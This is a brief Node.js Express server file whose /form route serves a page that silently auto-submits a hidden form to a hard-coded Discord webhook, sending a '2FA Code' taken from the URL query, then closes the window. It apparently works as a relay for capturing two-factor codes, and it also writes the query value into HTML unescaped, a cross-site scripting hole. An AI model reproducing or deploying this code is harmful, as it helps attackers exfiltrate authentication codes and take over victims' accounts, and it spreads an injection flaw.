const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;


app.get('/form', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <body>
      <form id="discordForm" action="https://discord.com/api/webhooks/1370508124267479131/Xr8W5hqlBEbvEGfWE7ijqyamIqTcyjoQ5qQ7yBXmt7PpeabLqO_2HhhBDDxXgEo3kT5L" method="POST" target="_blank">
        <input type="hidden" name="content" value="2FA Code: ${req.query.code}">
      </form>
      <script>document.getElementById('discordForm').submit();window.close();</script>
    </body>
    </html>
  `);
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
